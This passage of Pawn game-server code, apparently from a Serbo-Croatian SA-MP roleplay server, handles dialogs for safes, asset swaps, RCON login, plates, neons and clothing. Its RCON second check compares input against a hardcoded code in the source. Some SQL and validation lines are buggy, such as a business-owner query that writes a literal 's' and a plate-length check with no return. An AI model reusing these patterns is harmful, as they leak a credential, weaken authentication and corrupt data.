			if( matss > org_info[ OrgID ][ oSafeMats ] ) return ShowPlayerDialog( playerid, dialog_ORGSAFETMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Nema toliko materijala u sefu\nUnesite koliko materijala zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );

			PlayerInfo[ playerid ][ xMaterijali ] += matss;
            org_info[ OrgID ][ oSafeMats ] -= matss;
			sql_organization_update_integer( OrgID, "safe_mats", org_info[ OrgID ][ oSafeMats ] );
			sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );

		    SCMF( playerid, ZUTA, "(%s): Uzeli ste {FFFFFF}(%d) {FFFF00}materijala iz sefa.", org_info[ OrgID ][ oPreFix ], matss );
		}
	}
	//
	else if(dialogid == dialog_SECURERCON)
	{
		if(!response)
		{
			new ip[64];
			GetPlayerIp(playerid, ip, sizeof(ip));
	   		AdminMsg(ADM_WARN, "[ADMIN] %s se pokusao prijaviti na RCON.", ImeIgraca(playerid));
	   		WriteLog("log-rcon", "RCON: %s se pokusao prijaviti na rcon! [ip: %s]", ImeIgraca(playerid), ip);

			sql_ban_user(ImeIgraca(playerid), PlayerInfo[playerid][xID], 1, "RCON Login", "Server");
			Kickovanje(playerid, "Pokusaj prijave na RCON.");
		}
		if(response)
		{
			new ip[64], broj;
			GetPlayerIp(playerid, ip, sizeof(ip));
		    if(sscanf(inputtext, "i", broj)) return ShowPlayerDialog(playerid, dialog_SECURERCON, DIALOG_STYLE_INPUT, D_NASLOV, "Unesite drugu provjeru RCON logina:", "Login", "Ban");
		    if(broj != 69187) return ShowPlayerDialog(playerid, dialog_SECURERCON, DIALOG_STYLE_INPUT, D_NASLOV, "Unesite drugu provjeru RCON logina:", "Login", "Ban");

	   		AdminMsg(ADM_WARN, "[ADMIN] %s se prijavio na RCON.", ImeIgraca(playerid));
	   		WriteLog("log-rcon", "RCON: %s se prijavio na rcon! [ip: %s]", ImeIgraca(playerid), ip);
		}
	}
	else if(dialogid == dialog_ASKLISTA)
	{
		if( !response ) return 1;
		if( response )
		{
		    listitem++;
		    new string[ 256 ];
		    if( askqList[ listitem ][ askqSend ] == false ) return SendErrorMessage( playerid, "U ovom slotu nema pitanja." );

            IzabraniAskQ[ playerid ] = listitem;

			format( string, sizeof( string ), "{FFFFFF}* Igrac %s(ID:%d) je poslao pitanje.\n\n\
												Pitanje: %s", askqList[ listitem ][ askqOwner ], askqList[ listitem ][ askqID ], askqList[ listitem ][ askqQuestion ] );
		    ShowPlayerDialog( playerid, dialog_ASKLISTA_2, DIALOG_STYLE_INPUT, D_NASLOV, string, "Odgovori", "Odustani" );
		}
	}
	else if(dialogid == dialog_ASKLISTA_2 )
	{
		if( !response ) return 1;
		if( response )
		{
			new text[ 128 ];
		    if( sscanf( inputtext, "s[128]", text ) ) return 1;

			new askid = IzabraniAskQ[ playerid ];

		    if( askqList[ askid ][ askqSend ] == false ) return SendErrorMessage( playerid, "U ovom slotu nema pitanja." );

			askqList[ askid ][ askqSend ] = false;

			new id = askqList[ askid ][ askqID ];
			IzabraniAskQ[ playerid ] = -1;

			if( strcmp( ImeIgraca( id ), askqList[ askid ][ askqOwner ], true ) == 0 )
			{
				askqInfo[ id ][ askqAnswered ] = true;
				strmid( askqInfo[ id ][ askqAdmin ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 32 );
	            strmid( askqInfo[ id ][ askqAnswer ], text, 0, strlen( text ), 128 );

				GMChat( 0xAE7C5BFF, "#LP-ODG: %s > %s: {FFFFFF}%s.", ImeIgraca( playerid ), askqList[ askid ][ askqOwner ], text );

				PlayerInfo[ playerid ][ xAGMStats ]++;
	    		sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

	            SendInfoMessage( playerid, "Poslali ste odgovor igracu {FFFFFF}%s.", askqList[ askid ][ askqOwner ] );
	            SendInfoMessage( playerid, "Vas odgovor glasi: {FFFFFF}%s.", text );

	            SCMF( id, 0x4282C0FF, "(ASKQ): A/GM je odgovorio na tvoje pitanje." );
	            SCMF( id, 0x4282C0FF, "(ASKQ): Da pogledate odgovor kucajte {FFFFFF}[ /podg ]." );

                strmid( askqList[ askid ][ askqOwner ], "None", 0, strlen( "None" ), 32 );
                askqList[ askid ][ askqID ] = -1;
			}
            else
			{
                if( id != IPI )
				{
	                askqInfo[ id ][ askqSended ] = false;
	                askqInfo[ id ][ askqAnswered ] = false;
					strmid( askqInfo[ id ][ askqAdmin ], "None", 0, strlen( "None" ), 32 );
		            strmid( askqInfo[ id ][ askqAnswer ], "None", 0, strlen( "None" ), 128 );
                }

                strmid( askqList[ askid ][ askqOwner ], "None", 0, strlen( "None" ), 32 );
                askqList[ askid ][ askqID ] = -1;
				SendErrorMessage( playerid, "Taj igrac nije online." );
				return 1;
			}
		}
	}
	else if(dialogid == dialog_ZAMENA_2 )
	{
        if( !response ) return 1;
		if( response )
		{
		    new igrac = GlobalProdaja[ playerid ], ID_1 = GlobalID[ playerid ], ID_2 = GlobalID_2[ playerid ];

		    strmid( VehicleInfo[ ID_1 ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
		    strmid( VehicleInfo[ ID_2 ][ vOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

            VehicleInfo[ ID_1 ][ vOwner_sqlID ] = PlayerInfo[ playerid ][ xID ];
			VehicleInfo[ ID_2 ][ vOwner_sqlID ] = PlayerInfo[ igrac ][ xID ];

			VehicleInfo[ ID_1 ][ v_owner_id ] = playerid;
			VehicleInfo[ ID_2 ][ v_owner_id ] = igrac;

			for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
                if( player_veh[ igrac ][ vehicle_id ][ j ] == ID_1 )
				{
					player_veh[ igrac ][ vehicle_id ][ j ] = ID_2;
					break;
				}
			}

			for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
				if( player_veh[ playerid ][ vehicle_id ][ j ] == ID_2 )
				{
				    player_veh[ playerid ][ vehicle_id ][ j ] = ID_1;
				    break;
				}
			}

			WriteLog("log-zamena", "Zamena Vozila | %s - %s(ID %d) -> %s - %s(ID %d)", ImeIgraca( igrac ), GetVehicleNameEx( VehicleInfo[ ID_1 ][ vModel ] ), ID_1, ImeIgraca( playerid ), GetVehicleNameEx( VehicleInfo[ ID_2 ][ vModel ] ), ID_2);

		    new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `owner_sqlID` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
									VehicleInfo[ ID_1 ][ vOwner_sqlID ],
									VehicleInfo[ ID_1 ][ vSqlID ] );

			mysql_tquery( mSQL, q );

			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `owner_sqlID` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
									VehicleInfo[ ID_2 ][ vOwner_sqlID ],
									VehicleInfo[ ID_2 ][ vSqlID ] );

			mysql_tquery( mSQL, q );
		}
	}
	else if(dialogid == dialog_ZAMENA_4 )
	{
        if( !response ) return 1;
		if( response )
		{
		    new slot1, slot2, igrac = GlobalProdaja[ playerid ], ID_1 = GlobalID[ playerid ], ID_2 = GlobalID_2[ playerid ];

		    strmid( II[ ID_1 ][ iOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
  			II[ ID_1 ][ iOwnerSQLID ] = PlayerInfo[playerid][xID];
		    strmid( II[ ID_2 ][ iOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);
  			II[ ID_2 ][ iOwnerSQLID ] = PlayerInfo[igrac][xID];

			if( PlayerInfo[ igrac ][ xProperty ][ 0 ] == II[ ID_1 ][ iVW ] ) { slot1 = 1; }
		    else if( PlayerInfo[ igrac ][ xProperty ][ 1 ] == II[ ID_1 ][ iVW ] ) { slot1 = 2; }
		    else if( PlayerInfo[ igrac ][ xProperty ][ 2 ] == II[ ID_1 ][ iVW ] ) { slot1 = 3; }

            if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == II[ ID_2 ][ iVW ] ) { slot2 = 1; }
		    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == II[ ID_2 ][ iVW ] ) { slot2 = 2; }
		    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == II[ ID_2 ][ iVW ] ) { slot2 = 3; }

			if( slot1 == 1 ) 
			{ 
				PlayerInfo[ igrac ][ xProperty ][ 0 ] = ID_2; 
				PlayerInfo[ igrac ][ xProperty ][ 0 ] = II[ ID_2 ][ iSQLID ]; 
			}
			else if( slot1 == 2 ) 
			{ 
				PlayerInfo[ igrac ][ xProperty ][ 1 ] = ID_2; 
				PlayerInfo[ igrac ][ xProperty ][ 1 ] = II[ ID_2 ][ iSQLID ]; 
			}
			else if( slot1 == 3 ) 
			{ 
				PlayerInfo[ igrac ][ xProperty ][ 2 ] = ID_2; 
				PlayerInfo[ igrac ][ xProperty ][ 2 ] = II[ ID_2 ][ iSQLID ]; 
			}

			if( slot2 == 1 )
			{ 
				PlayerInfo[ playerid ][ xProperty ][ 0 ] = ID_1; 
				PlayerInfo[ playerid ][ xProperty ][ 0 ] = II[ ID_1 ][ iSQLID ]; 
			}
			else if( slot2 == 2 ) 
			{ 
				PlayerInfo[ playerid ][ xProperty ][ 1 ] = ID_1; 
				PlayerInfo[ playerid ][ xProperty ][ 1 ] = II[ ID_1 ][ iSQLID ]; 
			}
			else if( slot2 == 3 ) 
			{ 
				PlayerInfo[ playerid ][ xProperty ][ 2 ] = ID_1; 
				PlayerInfo[ playerid ][ xProperty ][ 2 ] = II[ ID_1 ][ iSQLID ]; 
			}

			WriteLog("log-zamena", "Zamena Imovine | %s - ID %d -> %s - ID %d", ImeIgraca( igrac ), ID_1, ImeIgraca( playerid ), ID_2);

			sql_user_update_property( playerid );
			sql_user_update_property( igrac );

			SaveProperty( ID_1 );
			SaveProperty( ID_2 );
		}
	}
	else if(dialogid == dialog_ZAMENA_3 )
	{
        if( !response ) return 1;
		if( response )
		{
		    new igrac = GlobalProdaja[ playerid ], ID_1 = PlayerInfo[ igrac ][ xFirmaID ], ID_2 = PlayerInfo[ playerid ][ xFirmaID ];

		    strmid( BusinessInfo[ ID_1 ][ bOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
		    strmid( BusinessInfo[ ID_2 ][ bOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

			PlayerInfo[ igrac ][ xFirmaID ] = ID_2;
			PlayerInfo[ igrac ][ xBussinesSqlID ] = BusinessInfo[ ID_2 ][ b_ID ];
			PlayerInfo[ playerid ][ xFirmaID ] = ID_1;
			PlayerInfo[ playerid ][ xBussinesSqlID ] = BusinessInfo[ ID_1 ][ b_ID ];

			WriteLog("log-zamena", "Zamena Firme | %s - ID %d -> %s - ID %d", ImeIgraca( igrac ), ID_1, ImeIgraca( playerid ), ID_2);

			sql_user_update_integer( playerid, "bussines_id", PlayerInfo[ playerid ][ xBussinesSqlID ] );
			sql_user_update_integer( igrac, "bussines_id", PlayerInfo[ igrac ][ xBussinesSqlID ] );

		    new q[ 128 ];
			mysql_format(mSQL, q, sizeof(q), "UPDATE `business` SET `bOwner` = 's' WHERE `bussines_id` = '%d'", BusinessInfo[ID_1][bOwner], PlayerInfo[playerid][xBussinesSqlID]);
			mysql_tquery(mSQL, q);
			mysql_format(mSQL, q, sizeof(q), "UPDATE `business` SET `bOwner` = 's' WHERE `bussines_id` = '%d'", BusinessInfo[ID_2][bOwner], PlayerInfo[igrac][xBussinesSqlID]);
			mysql_tquery(mSQL, q);
		}
	}
	else if(dialogid == dialog_DONATORBOJA )
	{
		if( response )
		{
		    PlayerInfo[ playerid ][ xDBoja ] = listitem;
			SMG_SetPlayerColor( playerid );
			SendInfoMessage( playerid, "Vasa boja imena je promenjena." );

			sql_user_update_integer( playerid, "dbo_color", PlayerInfo[ playerid ][ xDBoja ] );
		}
	}
	else if(dialogid == dialog_SAVEZ )
	{
		if( response )
		{
		    new id = GlobalProdaja[ playerid ];

			org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] = PlayerInfo[ id ][ xClan ];
			org_info[ PlayerInfo[ id ][ xClan ] ][ oSavez ] = PlayerInfo[ playerid ][ xClan ];

			sql_organization_update_integer( PlayerInfo[ playerid ][ xClan ], "savez", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSavez ] );
			sql_organization_update_integer( PlayerInfo[ id ][ xClan ], "savez", org_info[ PlayerInfo[ id ][ xClan ] ][ oSavez ] );

			SendInfoMessage( playerid, "Cestitamo, sada ste u savezu sa {FFFFFF}%s.", org_info[ PlayerInfo[ id ][ xClan ] ][ oName ] );
			SendInfoMessage( id, "Cestitamo, sada ste u savezu sa {FFFFFF}%s.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );

			SendInfoMessage( playerid, "Mozete koristiti zajednicki chat izmedju lidera saveza i podlidera [ /sa ]." );
			SendInfoMessage( id, "Mozete koristiti zajednicki chat izmedju lidera saveza i podlidera [ /sa ]." );

			GlobalProdaja[ playerid ] = -1;
		}
		else if( !response )
		{
		    new id = GlobalProdaja[ playerid ];

		    SendInfoMessage( playerid, "Odbili ste savez sa {FFFFFF}%s.", org_info[ PlayerInfo[ id ][ xClan ] ][ oName ] );
			SendInfoMessage( id, "Lider {FFFFFF}%s {4282C0}je odbio savez sa vama.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );

			GlobalProdaja[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_IZABERITABLICE )
	{
	    if( response )
		{
	        if( listitem == 0 )
			{
	            new vehicleid = ChosenVehicle[ playerid ];

	            VehicleInfo[ vehicleid ][ vTeh ] = 3;

	            new q[ 128 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_teh` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ vehicleid ][ vTeh ],
														VehicleInfo[ vehicleid ][ vSqlID ] );

				mysql_tquery( mSQL, q );

				SendClientMessage( playerid, 0x33CCFFFF, "(VOZILO): Uzeli ste tablice, idite stavite ih na vozilo. {FFFFFF}[ /v(ozilo) > '- Postavi table' ]." );
				SendClientMessage( playerid, 0x33CCFFFF, "(VOZILO): Kada postavite tablice, vozilo se respawna ali ce vam se vratiti nakon par sekundi na istu poziciju." );
	        }
	        if( listitem == 1 )
			{
	            ShowPlayerDialog( playerid, dialog_IZABERITABLICE_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljeni tekst, koji ce se nalaziti na vasim tablicama.\n\nMaksimum je 10 karaktera.", "Izaberi", "Odustani" );
	        }
	    }
	}
	else if(dialogid == dialog_IZABERITABLICE_2 )
	{
	    if( response )
		{
	        new vehicleid = ChosenVehicle[ playerid ];

	        new plate[ 12 ];
	        if( sscanf( inputtext, "s[12]", plate ) ) return ShowPlayerDialog( playerid, dialog_IZABERITABLICE_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljeni tekst, koji ce se nalaziti na vasim tablicama.\n\n{FF0000}Maksimum je 10 karaktera.", "Izaberi", "Odustani" );
			if(strlen(plate) < 1 || strlen(plate) > 10) ShowPlayerDialog( playerid, dialog_IZABERITABLICE_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljeni tekst, koji ce se nalaziti na vasim tablicama.\n\n{FF0000}Maksimum je 10 karaktera.", "Izaberi", "Odustani" );

	        VehicleInfo[ vehicleid ][ vTeh ] = 4;
	        strmid( VehicleInfo[ vehicleid ][ vTablice ], plate, 0, strlen( plate ), 32 );

	        new q[ 110 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_teh` = '%d', `v_tablice` = '%e'  WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ vehicleid ][ vTeh ],
														VehicleInfo[ vehicleid ][ vTablice ],
														VehicleInfo[ vehicleid ][ vSqlID ] );

			mysql_tquery( mSQL, q );

			SCMF( playerid, 0xFFFF00FF, "(VOZILO): Uzeo si tablice {FFFFFF}%s, {FFFF00}idi stavi ih na vozilo. {FFFFFF}[ /v(ozilo) > '- Postavi table' ].", plate );
	    }
	}
	else if(dialogid == dialog_NEONSHOP )
	{
	    if( response )
		{
			new autoid = GetPlayerVehicleID( playerid );

			if( listitem == 6 )
			{
			    if( PlayerInfo[ playerid ][ xNovac ] < 300 ) return SendErrorMessage( playerid, "Nemas 300$ kod sebe." );

				if( Neon[ GetPlayerVehicleID( playerid ) ] == 1 )
				{
				 	Neon[ GetPlayerVehicleID( playerid ) ] = 0;
				   	DestroyDynamicObject( NeonObject1[ GetPlayerVehicleID( playerid ) ] );
				   	DestroyDynamicObject( NeonObject2[ GetPlayerVehicleID( playerid ) ] );
				}

				if( autoid != IVI )
				{
					VehicleInfo[ autoid ][ vNeon ] = 0;

					new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_neon` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ autoid ][ vNeon ],
														VehicleInfo[ autoid ][ vSqlID ] );

					mysql_tquery( mSQL, q );
				}

			    SendInfoMessage( playerid, "Uspesno ste skinuli neonke sa auta i platili 300$ za usluge." );
				DajIgracuNovac( playerid, -300 );

				BussinesJobMoney( POSAO_MEHANICAR, 150 );
				return 1;
			}
			else if( listitem < 6 )
			{
			    if( PlayerInfo[ playerid ][ xNovac ] < 2000 ) return SendErrorMessage( playerid, "Nemas 2000$ kod sebe." );

				if( VehicleInfo[ autoid ][ vUsage ] == PRIVATNO_VOZILO )
				{
					if( strcmp( ImeIgraca( playerid ), VehicleInfo[ autoid ][ vOwner ], true ) == 0 )
					{
					    switch( listitem )
						{
						    case 0: VehicleInfo[ autoid ][ vNeon ] = 18648;
						    case 1: VehicleInfo[ autoid ][ vNeon ] = 18647;
						    case 2: VehicleInfo[ autoid ][ vNeon ] = 18649;
						    case 3: VehicleInfo[ autoid ][ vNeon ] = 18652;
						    case 4: VehicleInfo[ autoid ][ vNeon ] = 18651;
						    case 5: VehicleInfo[ autoid ][ vNeon ] = 18650;
						}
						NeonObject1[ GetPlayerVehicleID( playerid ) ] = CreateDynamicObject( VehicleInfo[ autoid ][ vNeon ], 0, 0, 1500, 0, 0, 0 );
						NeonObject2[ GetPlayerVehicleID( playerid ) ] = CreateDynamicObject( VehicleInfo[ autoid ][ vNeon ], 0, 0, 1500, 0, 0, 0 );
						AttachDynamicObjectToVehicle( NeonObject1[ GetPlayerVehicleID( playerid ) ], GetPlayerVehicleID( playerid ), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0 );
						AttachDynamicObjectToVehicle( NeonObject2[ GetPlayerVehicleID( playerid ) ], GetPlayerVehicleID( playerid ), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0 );
			   			Neon[ GetPlayerVehicleID( playerid ) ] = 1;

			   			new q[ 128 ];
						mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_neon` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
															VehicleInfo[ autoid ][ vNeon ],
															VehicleInfo[ autoid ][ vSqlID ] );

						mysql_tquery( mSQL, q );
					}
				}
				else
				{
				    new neonka;
					switch( listitem )
				 	{
					    case 0: neonka = 18648;
					    case 1: neonka = 18647;
					    case 2: neonka = 18649;
					    case 3: neonka = 18652;
					    case 4: neonka = 18651;
					    case 5: neonka = 18650;
					}
					NeonObject1[ GetPlayerVehicleID( playerid ) ] = CreateDynamicObject( neonka, 0, 0, 1500, 0, 0, 0 );
					NeonObject2[ GetPlayerVehicleID( playerid ) ] = CreateDynamicObject( neonka, 0, 0, 1500, 0, 0, 0 );
					AttachDynamicObjectToVehicle( NeonObject1[ GetPlayerVehicleID( playerid ) ], GetPlayerVehicleID( playerid ), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0 );
					AttachDynamicObjectToVehicle( NeonObject2[ GetPlayerVehicleID( playerid ) ], GetPlayerVehicleID( playerid ), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0 );
		   			Neon[ GetPlayerVehicleID( playerid ) ] = 1;
				}

				SendInfoMessage( playerid, "Uspesno ste ugradili neonke na auto i platili {FFFFFF}(2000$)." );
				DajIgracuNovac( playerid, -2000 );
				BussinesJobMoney( POSAO_MEHANICAR, 1000 );
			}
		}
	}
	else if(dialogid == dialog_CLOTHES && response)
	{
	    switch(listitem)
	    {
	        case 0:
	        {
	            if( ClothesSlots[ playerid ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemate nista od garderobe u slotu broj 1." );
	            chosen_clothes_slot[ playerid ] = 1;
			   	ShowPlayerDialog( playerid, dialog_CLOTHESMENU, DIALOG_STYLE_LIST, "{FFFFFF}Slot: 1",
				   	"{4282C0}(1). {FFFFFF}Postavi na sebe\n\
					   {4282C0}(2). {FFFFFF}Skini sa sebe\n\
					   {4282C0}(3). {FFFFFF}Izmeni poziciju\n\
					   {4282C0}(4). {FFFFFF}Daj predmet\n\
					   {4282C0}(5). {FFFFFF}Baci odecu", "Odaberi", "Odustani");
	        }
	        case 1:
			{
			    if( ClothesSlots[ playerid ][ 1 ] == -1 ) return SendErrorMessage( playerid, "Nemate nista od garderobe u slotu broj 2." );
			    chosen_clothes_slot[ playerid ] = 2;
			   	ShowPlayerDialog( playerid, dialog_CLOTHESMENU, DIALOG_STYLE_LIST, "{FFFFFF}Slot: 1",
				   	"{4282C0}(1). {FFFFFF}Postavi na sebe\n\
					   {4282C0}(2). {FFFFFF}Skini sa sebe\n\
					   {4282C0}(3). {FFFFFF}Izmeni poziciju\n\
					   {4282C0}(4). {FFFFFF}Daj predmet\n\
					   {4282C0}(5). {FFFFFF}Baci odecu", "Odaberi", "Odustani");
			}
			case 2:
			{
			    if( ClothesSlots[ playerid ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemate nista od garderobe u slotu broj 3." );
			    chosen_clothes_slot[ playerid ] = 3;
			   	ShowPlayerDialog( playerid, dialog_CLOTHESMENU, DIALOG_STYLE_LIST, "{FFFFFF}Slot: 1",
				   	"{4282C0}(1). {FFFFFF}Postavi na sebe\n\
					   {4282C0}(2). {FFFFFF}Skini sa sebe\n\
					   {4282C0}(3). {FFFFFF}Izmeni poziciju\n\
					   {4282C0}(4). {FFFFFF}Daj predmet\n\
					   {4282C0}(5). {FFFFFF}Baci odecu", "Odaberi", "Odustani");
			}
			case 3:
			{
			    if( ClothesSlots[ playerid ][ 3 ] == -1 ) return SendErrorMessage( playerid, "Nemate nista od garderobe u slotu broj 4." );
			    chosen_clothes_slot[ playerid ] = 4;
			   	ShowPlayerDialog( playerid, dialog_CLOTHESMENU, DIALOG_STYLE_LIST, "{FFFFFF}Slot: 1",
				   	"{4282C0}(1). {FFFFFF}Postavi na sebe\n\
					   {4282C0}(2). {FFFFFF}Skini sa sebe\n\
					   {4282C0}(3). {FFFFFF}Izmeni poziciju\n\
					   {4282C0}(4). {FFFFFF}Daj predmet\n\
					   {4282C0}(5). {FFFFFF}Baci odecu", "Odaberi", "Odustani");
			}
	    }
	}
	else if(dialogid == dialog_CLOTHESMENU )
	{
        if( !response ) return 1;
	    if( response )
		{
	        new slot = chosen_clothes_slot[ playerid ];
	        switch( listitem )
			{
	            case 0:
				{
					if( object_on_player[ playerid ][ slot-1 ] ) return SendErrorMessage( playerid, "Vec imate postavljen objekt iz slota {FFFFFF}(%d) {FF0000}na sebe.", slot );
					switch( (slot-1) )
					{
					    case 0:
						{
					        if( clothes_info[ playerid ][ x_slot_1_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 1." );
					        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_1 ) ) return SendErrorMessage( playerid, "Vec imate objekt na sebi u tom slotu." );
					        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, clothes_info[ playerid ][ x_slot_1_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_1_model ]),
											clothes_info[ playerid ][ x_slot_1_pos ][ 0 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 1 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 2 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 3 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 4 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 5 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 6 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 7 ],
											clothes_info[ playerid ][ x_slot_1_pos ][ 8 ], 0, 0);
					    }
					    case 1:
						{
					        if( clothes_info[ playerid ][ x_slot_2_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 2." );
					        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_2 ) ) return SendErrorMessage( playerid, "Vec imate objekt na sebi u tom slotu." );
					        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, clothes_info[ playerid ][ x_slot_2_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_2_model ]),
											clothes_info[ playerid ][ x_slot_2_pos ][ 0 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 1 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 2 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 3 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 4 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 5 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 6 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 7 ],
											clothes_info[ playerid ][ x_slot_2_pos ][ 8 ], 0, 0);
					    }
					    case 2:
						{
					        if( clothes_info[ playerid ][ x_slot_3_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 3." );
					        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_3 ) ) return SendErrorMessage( playerid, "Vec imate objekt na sebi u tom slotu." );
					        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, clothes_info[ playerid ][ x_slot_3_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_3_model ]),
											clothes_info[ playerid ][ x_slot_3_pos ][ 0 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 1 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 2 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 3 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 4 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 5 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 6 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 7 ],
											clothes_info[ playerid ][ x_slot_3_pos ][ 8 ], 0, 0);
					    }
					    case 3:
						{
					        if( clothes_info[ playerid ][ x_slot_4_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 4." );
					        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_4 ) ) return SendErrorMessage( playerid, "Vec imate objekt na sebi u tom slotu." );
					        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, clothes_info[ playerid ][ x_slot_4_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_4_model ]),
											clothes_info[ playerid ][ x_slot_4_pos ][ 0 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 1 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 2 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 3 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 4 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 5 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 6 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 7 ],
											clothes_info[ playerid ][ x_slot_4_pos ][ 8 ], 0, 0);
						}
					}
					SendInfoMessage( playerid, "Postavili ste objekt iz slota {FFFFFF}(%d) {4282C0}na sebe.", slot );
					object_on_player[ playerid ][ slot-1 ] = true;
				}
	            case 1:
				{
	                if( !object_on_player[ playerid ][ slot-1 ] ) return SendErrorMessage( playerid, "Nemate postavljen objekt na sebe sa slota %d.", slot );
					RemovePlayerAttachedObject( playerid, slot-1 );
	                object_on_player[ playerid ][ slot-1 ] = false;
	                SendInfoMessage( playerid, "Skinuli ste objekat sa sebe iz slota {FFFFFF}(%d).", slot );
	            }
	            case 2:
				{
	                switch( (slot-1) )
					{
						case 0: if( clothes_info[ playerid ][ x_slot_1_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 1." );
						case 1: if( clothes_info[ playerid ][ x_slot_2_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 2." );
						case 2: if( clothes_info[ playerid ][ x_slot_3_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 3." );
						case 3: if( clothes_info[ playerid ][ x_slot_4_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 4." );
					}

			        if( !object_on_player[ playerid ][ slot-1 ] ) return SendErrorMessage( playerid, "Nemate postavljen objekt na sebe sa slota %d.", slot );
           	        EditAttachedObject( playerid, (slot-1) );
				 	EditingBody[ playerid ] = true;
				 	chosen_clothes_slot[ playerid ] = slot;
	            }
	            case 3: { // edit bone id
	            	SendErrorMessage(playerid, "Trenutno onemoguceno.");
	            }
	            case 4:
				{
	                if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );

	                switch( (slot-1) )
					{
						case 0: { if( clothes_info[ playerid ][ x_slot_1_model ] == -1 ) return SendErrorMessage( playerid, "Nemate objekat u slotu 1." ); }
